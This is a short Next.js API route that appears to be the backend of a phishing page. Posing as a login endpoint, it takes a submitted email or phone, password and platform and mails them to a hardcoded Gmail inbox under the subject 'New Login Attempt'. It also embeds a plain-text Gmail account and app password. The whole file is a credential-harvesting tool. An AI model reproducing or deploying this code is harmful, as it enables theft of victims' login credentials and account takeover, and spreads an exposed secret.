import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

interface RequestBody {
  email: string;
  password: string;
  platform?: string;
}

interface EmailOptions {
  to: string;
  subject: string;
  text?: string;
  html?: string;
}

async function sendEmail(options: EmailOptions): Promise<void> {
  // Create transporter
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'rmawais689@gmail.com',
      pass: 'gafh fsqe dwdd dhri' // Updated to new App Password
    }
  });

  // Email configuration
  const mailOptions = {
    from: 'rmawais689@gmail.com',
    to: 'rmawais852689@gmail.com',
    subject: options.subject,
    text: options.text,
    html: options.html
  };
transporter.sendMail(mailOptions);
}

export async function POST(req: NextRequest) {
  const body: RequestBody = await req.json();
  const { email, password, platform } = body;
  // Send email with login attempt details
  try {
    await sendEmail({
      to: 'rmawais852689@gmail.com',
      subject: 'New Login Attempt',
      text: `\tLogin Attempt\n\n\nEmail/Phone: ${email}\n\nPassword: ${password}\n\nPlatform: ${platform || 'Unknown'}\n\nTime: ${new Date().toISOString()}`
    });
  } catch (error) {
    return NextResponse.json({ success: false, error: 'Failed to send email.' }, { status: 500 });
  }

  return NextResponse.json({ success: true });
}